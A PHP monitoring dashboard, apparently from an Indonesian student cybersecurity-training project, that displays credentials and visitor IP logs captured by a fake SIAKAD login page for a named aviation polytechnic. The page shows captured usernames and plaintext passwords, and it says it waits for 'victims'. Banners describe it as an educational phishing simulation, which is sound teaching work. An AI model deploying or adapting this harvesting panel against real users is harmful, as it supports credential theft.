<?php
// Dashboard monitoring credentials - auto refresh setiap 3 detik
$creds_file = __DIR__ . '/usernames.txt';
$ip_file = __DIR__ . '/ip.txt';

$credentials = file_exists($creds_file) ? file($creds_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
$ips = file_exists($ip_file) ? file($ip_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Dashboard Monitoring - Simulasi Phishing</title>
    <meta http-equiv="refresh" content="3">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0f172a; color: #e2e8f0; padding: 20px; }
        h1 { color: #f8fafc; margin-bottom: 5px; font-size: 24px; }
        .subtitle { color: #94a3b8; margin-bottom: 30px; font-size: 14px; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat-card {
            background: #1e293b; border-radius: 12px; padding: 20px 25px;
            min-width: 200px; border: 1px solid #334155;
        }
        .stat-card .number { font-size: 36px; font-weight: 700; color: #38bdf8; }
        .stat-card .label { color: #94a3b8; font-size: 13px; margin-top: 5px; }
        .stat-card.danger .number { color: #f87171; }
        .stat-card.success .number { color: #4ade80; }
        .section { margin-bottom: 30px; }
        .section h2 { color: #f1f5f9; font-size: 18px; margin-bottom: 15px; padding-bottom: 8px; border-bottom: 1px solid #334155; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #1e293b; color: #94a3b8; text-align: left; padding: 12px 15px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
        td { padding: 12px 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
        tr:hover td { background: #1e293b; }
        .badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
        .badge-red { background: #991b1b; color: #fca5a5; }
        .badge-blue { background: #1e3a5f; color: #93c5fd; }
        .empty { text-align: center; padding: 40px; color: #64748b; font-style: italic; }
        .live-dot { display: inline-block; width: 8px; height: 8px; background: #4ade80; border-radius: 50%; margin-right: 8px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .refresh-note { color: #64748b; font-size: 12px; }
        .cred-pass { color: #f87171; font-family: monospace; }
        .cred-user { color: #38bdf8; font-family: monospace; }
        .warning-banner {
            background: linear-gradient(135deg, #7c2d12, #991b1b); border-radius: 10px;
            padding: 15px 20px; margin-bottom: 25px; font-size: 13px;
            border: 1px solid #dc2626; color: #fecaca;
        }
        .warning-banner strong { color: #fff; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1><span class="live-dot"></span>Dashboard Monitoring</h1>
            <p class="subtitle">Simulasi Phishing SIAKAD — Politeknik Penerbangan Indonesia Curug</p>
        </div>
        <div class="refresh-note">Auto-refresh setiap 3 detik</div>
    </div>

    <div class="warning-banner">
        <strong>⚠ SIMULASI EDUKASI</strong> — Data di bawah ini ditangkap dari halaman login palsu untuk tujuan pelatihan keamanan siber. Jangan gunakan di luar konteks edukasi.
    </div>

    <div class="stats">
        <div class="stat-card danger">
            <div class="number"><?= count($credentials) ?></div>
            <div class="label">Kredensial Tertangkap</div>
        </div>
        <div class="stat-card">
            <div class="number"><?= count($ips) ?></div>
            <div class="label">Kunjungan (IP Log)</div>
        </div>
        <div class="stat-card success">
            <div class="number"><?= count($credentials) > 0 ? '●' : '○' ?></div>
            <div class="label">Status: <?= count($credentials) > 0 ? 'Ada Tangkapan' : 'Menunggu...' ?></div>
        </div>
    </div>

    <div class="section">
        <h2>Kredensial Tertangkap <span class="badge badge-red"><?= count($credentials) ?> data</span></h2>
        <?php if (empty($credentials)): ?>
            <div class="empty">Belum ada kredensial yang tertangkap. Menunggu korban mengisi form login...</div>
        <?php else: ?>
        <table>
            <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Raw</th></tr></thead>
            <tbody>
            <?php foreach ($credentials as $i => $line):
                preg_match('/Username:\s*(.+?)\s*Pass:\s*(.+)/', $line, $m);
                $user = $m[1] ?? '-';
                $pass = $m[2] ?? '-';
            ?>
                <tr>
                    <td><?= $i + 1 ?></td>
                    <td><span class="cred-user"><?= htmlspecialchars($user) ?></span></td>
                    <td><span class="cred-pass"><?= htmlspecialchars($pass) ?></span></td>
                    <td style="color:#64748b;font-size:12px"><?= htmlspecialchars($line) ?></td>
                </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>

    <div class="section">
        <h2>Log IP Pengunjung <span class="badge badge-blue"><?= count($ips) ?> log</span></h2>
        <?php if (empty($ips)): ?>
            <div class="empty">Belum ada pengunjung.</div>
        <?php else: ?>
        <table>
            <thead><tr><th>#</th><th>Detail</th></tr></thead>
            <tbody>
            <?php foreach ($ips as $i => $line): ?>
                <tr>
                    <td><?= $i + 1 ?></td>
                    <td style="font-family:monospace;font-size:13px"><?= htmlspecialchars($line) ?></td>
                </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
        <?php endif; ?>
    </div>
    <footer style="text-align:center; padding:30px 20px 20px; color:#64748b; font-size:12px; border-top:1px solid #1e293b; margin-top:40px;">
        <p style="margin-bottom:5px; color:#94a3b8; font-weight:600;">Program Kreativitas Mahasiswa — Pengabdian kepada Masyarakat (PKM-PM)</p>
        <p>Politeknik Penerbangan Indonesia Curug</p>
        <p style="margin-top:8px; color:#475569;">Simulasi ini merupakan bagian dari media pembelajaran keamanan siber<br>dan tidak ditujukan untuk aktivitas ilegal.</p>
    </footer>
</body>
</html>
